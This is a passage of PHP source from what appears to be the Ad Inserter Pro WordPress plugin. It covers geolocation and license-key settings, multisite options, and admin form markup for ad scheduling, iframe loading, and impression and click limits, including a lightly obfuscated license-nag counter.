  return ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB']);
}

function get_maxmind_license_key ($blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_MAXMIND_LICENSE_KEY'])) $ai_db_options_multisite ['MULTISITE_MAXMIND_LICENSE_KEY'] = DEFAULT_MAXMIND_LICENSE_KEY;
    return ($ai_db_options_multisite ['MULTISITE_MAXMIND_LICENSE_KEY']);
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['MAXMIND_LICENSE_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['MAXMIND_LICENSE_KEY'] = DEFAULT_MAXMIND_LICENSE_KEY;

  return ($ai_db_options [AI_OPTION_GLOBAL]['MAXMIND_LICENSE_KEY']);
}

function get_geo_db_updates ($blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_GEO_DB_UPDATES'])) $ai_db_options_multisite ['MULTISITE_GEO_DB_UPDATES'] = DEFAULT_GEO_DB_UPDATES;
    return ($ai_db_options_multisite ['MULTISITE_GEO_DB_UPDATES']);
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_UPDATES'])) $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_UPDATES'] = DEFAULT_GEO_DB_UPDATES;

  return ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_UPDATES']);
}

function get_geo_db_location ($saved_value = false, $blog_value = false) {
  global $ai_db_options, $ai_db_options_multisite;

  if (is_multisite () && !$blog_value) {
    if (!isset ($ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION'])) $ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION'] = DEFAULT_GEO_DB_LOCATION;
    if ($saved_value) return ($ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION']);

    $path = $ai_db_options_multisite ['MULTISITE_GEO_DB_LOCATION'];
    if (isset ($path [0]) && $path [0] != '/') {
      $path = get_home_path() . $path;
    }
    return $path;
  }

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION'])) $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION'] = DEFAULT_GEO_DB_LOCATION;

  if ($saved_value) return ($ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION']);

  $path = $ai_db_options [AI_OPTION_GLOBAL]['GEO_DB_LOCATION'];
  if (isset ($path [0]) && $path [0] != '/') {
    $path = get_home_path() . $path;
  }
  return $path;
}

function ai_filter_global_settings (&$options) {
  global $ai_db_options, $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {

    if (isset ($_POST ['hide_key'])) {
      $client = $_POST ['hide_key'];
      if ($client == '1') {
        update_option (WP_AD_INSERTER_PRO_CLIENT, $client);
      }
    }
    elseif (isset ($_GET ['ai-key']) && $_GET ['ai-key'] == $ad_inserter_globals ['LICENSE_KEY']) {
      delete_option (WP_AD_INSERTER_PRO_CLIENT);
    }

    if (isset ($_POST ['license_key'])) {
      $license_key = trim ($_POST ['license_key']);
      update_option (WP_AD_INSERTER_PRO_KEY, base64_encode (ai_random_name ($license_key, 4) . filter_string ($license_key)));
      delete_option (WP_AD_INSERTER_PRO_LICENSE);

      if (!empty ($license_key)) {
        if ((isset ($_POST ['plugin_status']) && $_POST ['plugin_status'] == '1') || empty ($ad_inserter_globals ['AI_TYPE'])) {
          $ai_data = get_ai_data ($license_key);
          if (isset ($ai_data->sid)) {
            $ai_code = $ai_data->sid;
            $ai_type = $ai_data->pid;

            $ad_inserter_globals ['AI_STATUS'] = $ai_code;
            $ad_inserter_globals ['AI_TYPE']   = $ai_type;
            $options [AI_PRO]  = filter_string ($ai_type);
            $options [AI_CODE] = filter_string ($ai_code);
            $options [AI_CODE_TIME] = time ();
          }
        } else {
          $options [AI_PRO]  = $ad_inserter_globals ['AI_TYPE'];
          $options [AI_CODE] = $ad_inserter_globals ['AI_STATUS'];
          $options [AI_CODE_TIME] = isset ($ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]) ? $ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]: time ();
        }
      }

      $options [AI_RST] = get_plugin_counter ();
    }
    elseif ($ad_inserter_globals ['LICENSE_KEY'] != '' && get_option (WP_AD_INSERTER_PRO_CLIENT) !== false) {
      $options [AI_PRO]  = $ad_inserter_globals ['AI_TYPE'];
      $options [AI_CODE] = $ad_inserter_globals ['AI_STATUS'];
      $options [AI_CODE_TIME] = isset ($ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]) ? $ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]: time ();

      $options [AI_RST] = get_plugin_counter ();
    }
  }

  for ($group_number = 1; $group_number <= AD_INSERTER_GEO_GROUPS; $group_number ++) {
    if (isset ($_POST ['group-name-'.$group_number]))
      $options ['COUNTRY_GROUP_NAME_' . $group_number]   = filter_string ($_POST ['group-name-'.$group_number]);
    if (isset ($_POST ['group-country-list-'.$group_number]))
      $options ['GROUP_COUNTRIES_'.$group_number]  = filter_option (AI_OPTION_COUNTRY_LIST, $_POST ['group-country-list-'.$group_number]);
  }

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (isset ($_POST ['tracking']))                  $options ['TRACKING']                     = filter_option ('tracking',        $_POST ['tracking']);
    if (isset ($_POST ['internal-tracking']))         $options ['INTERNAL_TRACKING']            = filter_option ('internal-tracking', $_POST ['internal-tracking']);
    if (isset ($_POST ['external-tracking']))         $options ['EXTERNAL_TRACKING']            = filter_option ('external-tracking', $_POST ['external-tracking']);
    if (isset ($_POST ['external-tracking-category']))$options ['EXTERNAL_TRACKING_CATEGORY']   = filter_option ('EXTERNAL_TRACKING_CATEGORY', $_POST ['external-tracking-category']);
    if (isset ($_POST ['external-tracking-action']))  $options ['EXTERNAL_TRACKING_ACTION']     = filter_option ('EXTERNAL_TRACKING_ACTION', $_POST ['external-tracking-action']);
    if (isset ($_POST ['external-tracking-label']))   $options ['EXTERNAL_TRACKING_LABEL']      = filter_option ('EXTERNAL_TRACKING_LABEL', $_POST ['external-tracking-label']);
    if (isset ($_POST ['track-logged-in']))           $options ['TRACKING_LOGGED_IN']           = filter_option ('track-logged-in', $_POST ['track-logged-in']);
    if (isset ($_POST ['track-pageviews']))           $options ['TRACK_PAGEVIEWS']              = filter_option ('track-pageviews', $_POST ['track-pageviews']);
    if (isset ($_POST ['click-detection']))           $options ['CLICK_DETECTION']              = filter_option ('click-detection', $_POST ['click-detection']);
    if (isset ($_POST ['report-header-image']))       $options ['REPORT_HEADER_IMAGE']          = filter_option ('REPORT_HEADER_IMAGE', $_POST ['report-header-image']);
    if (isset ($_POST ['report-header-title']))       $options ['REPORT_HEADER_TITLE']          = filter_option ('REPORT_HEADER_TITLE', $_POST ['report-header-title']);
    if (isset ($_POST ['report-header-description'])) $options ['REPORT_HEADER_DESCRIPTION']    = filter_option ('REPORT_HEADER_DESCRIPTION', $_POST ['report-header-description']);
    if (isset ($_POST ['report-footer']))             $options ['REPORT_FOOTER']                = filter_option ('REPORT_FOOTER', $_POST ['report-footer']);
    if (isset ($_POST ['report-key']))                $options ['REPORT_KEY']                   = filter_string ($_POST ['report-key']);
  }

  if (isset ($_POST ['adb-detection']))       $options ['ADB_DETECTION']                = filter_option ('adb-detection',       $_POST ['adb-detection']);
  if (isset ($_POST ['geo-db']))              $options ['GEO_DB']                       = filter_option ('GEO_DB',              $_POST ['geo-db']);
  if (isset ($_POST ['geo-db-updates']))      $options ['GEO_DB_UPDATES']               = filter_option ('geo-db-updates',      $_POST ['geo-db-updates']);
  if (isset ($_POST ['maxmind-license-key'])) $options ['MAXMIND_LICENSE_KEY']          = filter_option ('MAXMIND_LICENSE_KEY', $_POST ['maxmind-license-key']);


  if (isset ($_POST ['geo-db-location']))     $options ['GEO_DB_LOCATION']              = filter_string ($_POST ['geo-db-location']);
}

function ai_filter_multisite_settings (&$options) {
  if (isset ($_POST ['multisite_settings_page']))       $options ['MULTISITE_SETTINGS_PAGE']      = filter_option ('multisite_settings_page',       $_POST ['multisite_settings_page']);
  if (isset ($_POST ['multisite_widgets']))             $options ['MULTISITE_WIDGETS']            = filter_option ('multisite_widgets',             $_POST ['multisite_widgets']);
  if (isset ($_POST ['multisite_php_processing']))      $options ['MULTISITE_PHP_PROCESSING']     = filter_option ('multisite_php_processing',      $_POST ['multisite_php_processing']);
  if (isset ($_POST ['multisite_exceptions']))          $options ['MULTISITE_EXCEPTIONS']         = filter_option ('multisite_exceptions',          $_POST ['multisite_exceptions']);
  if (isset ($_POST ['multisite_main_for_all_blogs']))  $options ['MULTISITE_MAIN_FOR_ALL_BLOGS'] = filter_option ('multisite_main_for_all_blogs',  $_POST ['multisite_main_for_all_blogs']);
  if (isset ($_POST ['multisite_site_admin_page']))     $options ['MULTISITE_SITE_ADMIN_PAGE']    = filter_option ('multisite_site_admin_page',     $_POST ['multisite_site_admin_page']);
}

function ai_check_multisite_options_2 (&$options) {
  $options ['MULTISITE_GEO_DB']               = get_geo_db (true);
  $options ['MULTISITE_GEO_DB_UPDATES']       = get_geo_db_updates (true);
  $options ['MULTISITE_MAXMIND_LICENSE_KEY']  = get_maxmind_license_key (true);
  $options ['MULTISITE_GEO_DB_LOCATION']      = get_geo_db_location (true, true);
}


class ai_puc {
  var $multisite_id;
  function __construct () {
    $this->multisite_id = 2;
  }
}

function ai_save_settings () {
  $key = get_option (constant ('WP' . '_AD_' . 'INSERTER_' . 'PR' . 'O_K' . 'E' . 'Y'), "");
  if ($key == '') {
    $close = get_transient ('ai-close') + 1;
    set_transient ('ai-close', $close, 90 * 24 * 60 * 60);
    if ($close - 20 > 0) {
      delete_transient ('ai-close');
      $puc = new ai_puc ();
      puc_request_info_result ($puc);
    }
  } else delete_transient ('ai-close');
}

function ai_plugin_settings_tab ($exceptions) {
  if (get_geo_db () == AI_GEO_DB_MAXMIND && !defined ('AI_MAXMIND_DB')) $style_g = "font-weight: bold; color: #e44;"; else $style_g = "";
  if (!empty ($exceptions)) $style_e = "font-weight: bold; color: #66f;"; else $style_e = "";
  $style_m = '';
  if (get_global_tracking () != AI_TRACKING_DISABLED) $style_t = "font-weight: bold; color: #66f;"; else $style_t = "";

?>
      <li id="ai-c" class="ai-plugin-tab"><a href="#tab-geo-targeting"><span style="<?php echo $style_g ?>"><?php _e ('Geolocation', 'ad-inserter'); ?></span></a></li>
<?php
  if ($exceptions !== false) {
?>
      <li id="ai-e" class="ai-plugin-tab"><a href="#tab-exceptions"><span style="<?php echo $style_e ?>"><?php _e ('Exceptions', 'ad-inserter'); ?></span></a></li>
<?php
  }
  if (is_multisite() && is_main_site ()) {
?>
      <li id="ai-m" class="ai-plugin-tab"><a href="#tab-multisite"><span style="<?php echo $style_m ?>"><?php _e ('Multisite', 'ad-inserter'); ?></span></a></li>
<?php
  }
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
?>
      <li id="ai-t" class="ai-plugin-tab"><a href="#tab-tracking"><span style="<?php echo $style_t ?>"><?php _e ('Tracking', 'ad-inserter'); ?></span></a></li>
<?php
  }
}

function ai_scheduling_options ($obj) {
?>
        <option value="<?php echo AI_SCHEDULING_BETWEEN_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_BETWEEN_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_BETWEEN_DATES; ?></option>
        <option value="<?php echo AI_SCHEDULING_OUTSIDE_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_OUTSIDE_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_OUTSIDE_DATES; ?></option>
        <option value="<?php echo AI_SCHEDULING_PUBLISHED_BETWEEN_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_PUBLISHED_BETWEEN_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_PUBLISHED_BETWEEN_DATES; ?></option>
        <option value="<?php echo AI_SCHEDULING_PUBLISHED_OUTSIDE_DATES; ?>" <?php echo ($obj->get_scheduling() == AI_SCHEDULING_PUBLISHED_OUTSIDE_DATES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_INSERT_PUBLISHED_OUTSIDE_DATES; ?></option>
<?php
}

function ai_scheduling_data ($block, $obj, $default) {
  global $block_object;

  $scheduling_dates_text = '';
  $scheduling_dates_text_style = '';
  if ($obj->get_scheduling() == AI_SCHEDULING_BETWEEN_DATES) {

    $current_time = current_time ('timestamp');
    $start_date   = strtotime ($obj->get_schedule_start_date () . ' ' . $obj->get_schedule_start_time (), $current_time);
    $end_date     = strtotime ($obj->get_schedule_end_date() . ' ' . $obj->get_schedule_end_time (), $current_time);

    if ($current_time < $start_date) {
      $difference = $start_date - $current_time;
      $days = intval ($difference / (3600 * 24));
      $hours = intval (($difference - ($days * 3600 * 24)) / 3600);
      $minutes = intval (($difference - ($days * 3600 * 24) - ($hours * 3600)) / 60);
                                         // translators: %d: days, hours, minutes
      $scheduling_dates_text  = sprintf (__ ('Scheduled in %d days %d hours %d minutes', 'ad-inserter'), $days, $hours, $minutes);
      $scheduling_dates_text_style = '';
    }
    elseif ($current_time < $end_date) {
      $difference = $end_date - $current_time;
      $days = intval ($difference / (3600 * 24));
      $hours = intval (($difference - ($days * 3600 * 24)) / 3600);
      $minutes = intval (($difference - ($days * 3600 * 24) - ($hours * 3600)) / 60);
                                         // translators: %s: HTML dash separator, %d: days, hours, minutes, &mdash; is HTML code for long dash separator
      $scheduling_dates_text  = sprintf (__ ('Active %s expires in %d days %d hours %d minutes', 'ad-inserter'), '&mdash;', $days, $hours, $minutes);
      $scheduling_dates_text_style = 'color: #66f;';
    }
    else {
      $scheduling_dates_text  = __ ('Expired', 'ad-inserter');
      $scheduling_dates_text_style = 'color: #e44;';
    }
  }

?>
      <span id="scheduling-between-dates-1-<?php echo $block; ?>">
        <span style="float: right;">
          <?php _e ('fallback', 'ad-inserter'); ?>
          <select id="fallback-<?php echo $block; ?>" style="margin: 0 1px; max-width: 260px;" name="<?php echo AI_OPTION_FALLBACK, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_fallback(); ?>" title="<?php _e ('Block to be used when scheduling expires', 'ad-inserter'); ?>">
            <option value="" <?php echo ($obj->get_fallback()=='') ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php _e ('Disabled', 'ad-inserter'); ?></option>
<?php

  for ($fallback_block = 1; $fallback_block <= 96; $fallback_block ++) {
?>
            <option value="<?php echo $fallback_block; ?>" <?php echo ($obj->get_fallback()==$fallback_block) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo $fallback_block, ' - ', $block_object [$fallback_block]->get_ad_name (); ?></option>
<?php
  }
?>
          </select>
        </span>
      </span>

      <div id="scheduling-between-dates-2-<?php echo $block; ?>" style="margin-top: 8px; min-height: 24px;">
        <input placeholder='<?php _e ('Start date', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-date-on-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_START_DATE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_start_date(); ?>" value="<?php echo $obj->get_schedule_start_date(); ?>" title="<?php _e ('Enter date in format yyyy-mm-dd', 'ad-inserter'); ?>"/>
        <input placeholder='<?php _e ('Start time', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-time-on-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_START_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_start_time(); ?>" value="<?php echo $obj->get_schedule_start_time(); ?>" title="<?php _e ('Enter time in format hh:mm:ss, empty means 00:00:00', 'ad-inserter'); ?>" />
        <?php _e ('and', 'ad-inserter'); ?>
        <input placeholder='<?php _e ('End date', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-date-off-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_END_DATE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_end_date(); ?>" value="<?php echo $obj->get_schedule_end_date(); ?>" title="<?php echo $scheduling_dates_text; ?>" />
        <input placeholder='<?php _e ('End time', 'ad-inserter'); ?>' class="ai-date-input" id="scheduling-time-off-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_END_TIME, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_end_time(); ?>" value="<?php echo $obj->get_schedule_end_time(); ?>" title="<?php echo $scheduling_dates_text; ?>" />

        <input style="display: none;" id="scheduling-weekdays-value-<?php echo $block; ?>" type="text" name="<?php echo AI_OPTION_WEEKDAYS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_schedule_weekdays (); ?>" value="<?php echo $obj->get_schedule_weekdays (); ?>" />
        <span id="scheduling-weekdays-<?php echo $block; ?>" class="ai-weekdays" title="<?php _e ('Select wanted days in week', 'ad-inserter'); ?>"></span>
        <div style="clear: right;"></div>
      </div>
<?php
}

function ai_iframes ($block, $obj, $default) {
  if (defined ('AI_BLOCKS_IN_IFRAMES') && AI_BLOCKS_IN_IFRAMES) { ?>
        <div class="rounded">
          <table class="responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td>
                  <input type="hidden" name="<?php echo AI_OPTION_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input id="iframe-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_iframe (); ?>" <?php if ($obj->get_iframe () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="iframe-<?php echo $block; ?>"><?php _e ('Load in iframe', 'ad-inserter'); ?></label>
                </td>
                <td>
                  <span style="display: table-cell; white-space: nowrap; float: left; padding-left: 20px;">
                    <?php _e ('Width', 'ad-inserter'); ?>
                    <input type="text" name="<?php echo AI_OPTION_IFRAME_WIDTH, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_iframe_width (); ?>" value="<?php echo $obj->get_iframe_width (); ?>" title= "<?php _e ('iframe width, empty means full width (100%)', 'ad-inserter'); ?>" size="1" maxlength="4" />
                    px
                  </span>
                </td>
                <td>
                  <span style="display: table-cell; white-space: nowrap; float: left; padding-left: 20px;">
                    <?php _e ('Height', 'ad-inserter'); ?>
                    <input type="text" name="<?php echo AI_OPTION_IFRAME_HEIGHT, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_iframe_height (); ?>" value="<?php echo $obj->get_iframe_height (); ?>" title= "<?php _e ('iframe height, empty means adjust it to iframe content height', 'ad-inserter'); ?>" size="1" maxlength="4" />
                    px
                  </span>
                </td>
                <td>
                  <input type="hidden" name="<?php echo AI_OPTION_LABEL_IN_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input id="label-in-iframe-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_LABEL_IN_IFRAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_label_in_iframe (); ?>" <?php if ($obj->get_label_in_iframe () == AI_ENABLED) echo 'checked '; ?> />
                  <label for="label-in-iframe-<?php echo $block; ?>"><?php _e ('Ad label in iframe', 'ad-inserter'); ?></label>
                </td>
<?php if ($obj->get_iframe ()): ?>
                <td style="float: right;">
                  <span style="display: table-cell; white-space: nowrap; float: left; padding-left: 20px;">
                    <button id="iframe-preview-button-<?php echo $block; ?>" type="button" class='ai-button2' style="display: none; margin-right: 4px;" title="<?php _e ('Preview iframe code', 'ad-inserter'); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>"><?php _e ('Preview', 'ad-inserter'); ?></button>
                  </span>
                </td>
<?php endif; ?>
              </tr>
            </tbody>
          </table>
        </div>
<?php }
}

function ai_limits_adb_action_0 ($block, $adb_style, $limits_style) {
  if (defined ('AD_INSERTER_LIMITS') && AD_INSERTER_LIMITS) {
?>
        <li id="ai-misc-limits-<?php echo $block; ?>"><a href="#tab-limits-<?php echo $block; ?>"><span style="<?php echo $limits_style; ?>"><?php _e ('Limits', 'ad-inserter'); ?></span></a></li>
<?php
  }
  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
?>
        <li id="ai-misc-adb-<?php echo $block; ?>"><a href="#tab-adb-<?php echo $block; ?>"><span style="<?php echo $adb_style; ?>"><?php _e ('Ad Blocking', 'ad-inserter'); ?></span></a></li>
<?php
  }
}

function ai_warnings ($block) {
?>
  <div id="tracking-wrapping-warning-<?php echo $block; ?>" class="rounded" style="display: none;">
     <span style="margin-top: 5px;"><?php /* translators: 1, 2 and 3, 4: HTML tags */
     printf (__('%1$s WARNING: %2$s %3$s No wrapping %4$s style has no wrapping code needed for tracking!', 'ad-inserter'),
     '<strong><span style="color: red;">',
     '</span></strong>',
     '<strong>',
     '</strong>'); ?></span>
  </div>

  <div id="sticky-scroll-warning-<?php echo $block; ?>" class="rounded" style="display: none;">
     <span style="margin-top: 5px;"><?php /* translators: 1, 2, 4, 5: HTML tags, 3: Scroll with the content, 6: Above header */
     printf (__('%1$s WARNING: %2$s vertical position %3$s needs %4$s Output buffering %5$s enabled and automatic insertion %6$s!', 'ad-inserter'),
     '<strong><span style="color: red;">',
     '</span></strong>',
     '<strong>'.AI_TEXT_SCROLL_WITH_THE_CONTENT.'</strong>',
     '<strong>',
     '</strong>',
     '<strong>'.AI_TEXT_ABOVE_HEADER.'</strong>'); ?></span>
  </div>
<?php
}

function ai_limits_adb_action ($block, $obj, $default) {
  global $block_object, $ai_wp_data;

  if (defined ('AD_INSERTER_LIMITS') && AD_INSERTER_LIMITS) {
    $impressions = '';
    $clicks = '';
    $time_period_impressions = '';
    $time_period_clicks = '';
    if ($obj->get_limit_impressions_time_period ()) {
      $data_impressions = ai_get_impressions_and_clicks ($block, $obj->get_limit_impressions_time_period (), true);
      $impressions = $data_impressions [0];
      $clicks = $data_impressions [1];
      $time_period_impressions = $data_impressions [2];
    }
    if ($obj->get_limit_clicks_time_period ()) {
      $data_clicks = ai_get_impressions_and_clicks ($block, $obj->get_limit_clicks_time_period (), true);
      $impressions = $data_clicks [0];
      $clicks = $data_clicks [1];
      $time_period_clicks = $data_clicks [3];
    }
    if ($impressions == '' || $clicks == '') {
      $data_block = ai_get_impressions_and_clicks ($block, 1, true);
      $impressions = $data_block [0];
      $clicks = $data_block [1];
    }

    $global_tracking = get_global_tracking ();
    $block_tracking = $obj->get_tracking (true);

    if (!$global_tracking) {
      $warning_style_tracking = '';
      $warning_title_tracking = __('Tracking is globally disabled', 'ad-inserter');
    }
    elseif (!$block_tracking) {
      $warning_style_tracking = '';
      $warning_title_tracking = __('Tracking for this block is disabled', 'ad-inserter');
    }
    else {
      $warning_style_tracking = 'display: none;';
      $warning_title_tracking = '';
    }

    $warning_style_cfp = 'display: none;';
    $warning_title_cfp = '';
    if ($obj->get_trigger_click_fraud_protection ()) {
      if (!$global_tracking) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Tracking is globally disabled', 'ad-inserter');
      }
      elseif (!$block_tracking) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Tracking for this block is disabled', 'ad-inserter');
      }
      elseif ($obj->get_trigger_click_fraud_protection () && !get_click_fraud_protection ()) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Click fraud protection is globally disabled', 'ad-inserter');
      }
      elseif (!$obj->get_visitor_limit_clicks_per_time_period () || !$obj->get_visitor_limit_clicks_time_period ()) {
        $warning_style_cfp = '';
        $warning_title_cfp = __('Max clicks per time period are not defined', 'ad-inserter');
      }
    }

?>
      <div id="tab-limits-<?php echo $block; ?>" style="min-height: 24px; padding: 0;">

        <div class="rounded">
          <table class="responsive-table" style="width: 100%;" cellspacing=0 cellpadding=0 >
            <tbody>
              <tr>
                <td style="display: table-cell; padding-bottom: 8px;">
                  <strong>
                  <?php // Translators: Max n impressions ?>
                  <?php _e ('General limits', 'ad-inserter'); ?>
                  </strong>
                </td>
                <td style="display: table-cell; padding-bottom: 8px;  width: 35%; text-align: center;">
                  <strong>
                  <?php // Translators: Max n impressions per x days ?>
                  <?php _e ('Current value', 'ad-inserter'); ?>
                  </strong>
                  <span title='<?php echo $warning_title_tracking; ?>' style='font-size: 16px; vertical-align: middle; padding: 0; <?php echo $warning_style_tracking; ?>'>&#x26A0;</span>
                </td>
                <td style="display: table-cell;">
                  &nbsp;
                </td>
                <td style="display: table-cell;">
                  &nbsp;
                </td>
                <td style="display: table-cell; padding-bottom: 8px; text-align: right;">
                  <strong>
                  <?php _e ('Current value', 'ad-inserter'); ?>
                  </strong>
                </td>
              </tr>
              <tr>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_MAX_IMPRESSIONS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_max_impressions (); ?>" value="<?php echo $obj->get_max_impressions (); ?>" title="<?php _e ('Maximum number of impressions for this block. Empty means no general impression limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_max_impressions () <= $impressions ? 'color: red;' : ''; ?>" />
                  <?php // Translators: Max n impressions ?>
                  <?php echo _n ('impression', 'impressions', $obj->get_max_impressions (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px; text-align: center;">
                  <?php echo $impressions; ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_IMPRESSIONS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_impressions_per_time_period (); ?>" value="<?php echo $obj->get_limit_impressions_per_time_period (); ?>" title= "<?php _e ('Maximum number of impressions per time period. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_limit_impressions_per_time_period () <= $time_period_impressions ? 'color: red;' : ''; ?>" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('impression', 'impressions', $obj->get_limit_impressions_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px;">
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_IMPRESSIONS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_impressions_time_period (); ?>" value="<?php echo $obj->get_limit_impressions_time_period (); ?>" title= "<?php _e ('Time period in days. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n impressions per x days ?>
                  <?php echo _n ('day', 'days', $obj->get_limit_impressions_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; padding-bottom: 4px; text-align: right;">
                  <?php echo $time_period_impressions; ?>
                </td>
              </tr>
              <tr>
                <td style="display: table-cell;">
                  <?php // Translators: Max n clicks ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_MAX_CLICKS, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_max_clicks (); ?>" value="<?php echo $obj->get_max_clicks (); ?>" title= "<?php _e ('Maximum number of clicks on this block. Empty means no general click limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_max_clicks () <= $clicks ? 'color: red;' : ''; ?>"/>
                  <?php // Translators: Max n clicks ?>
                  <?php echo _n ('click', 'clicks', $obj->get_max_clicks (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell; text-align: center;">
                  <?php echo $clicks; ?>
                </td>
                <td style="display: table-cell;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php _e ('Max', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_CLICKS_PER_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_clicks_per_time_period (); ?>" value="<?php echo $obj->get_limit_clicks_per_time_period (); ?>" title= "<?php _e ('Maximum number of clicks per time period. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" style="<?php echo $obj->get_limit_clicks_per_time_period () <= $time_period_clicks ? 'color: red;' : ''; ?>" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('click', 'clicks', $obj->get_limit_clicks_per_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell;">
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo '&nbsp;'; _e('per', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_LIMIT_CLICKS_TIME_PERIOD, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_limit_clicks_time_period (); ?>" value="<?php echo $obj->get_limit_clicks_time_period (); ?>" title= "<?php _e ('Time period in days. Empty means no time limit.', 'ad-inserter'); ?>" size="2" maxlength="6" />
                  <?php // Translators: Max n clicks per x days ?>
                  <?php echo _n ('day', 'days', $obj->get_limit_clicks_time_period (), 'ad-inserter'); ?>
                </td>
                <td style="display: table-cell;padding-bottom: 4px; text-align: right;">
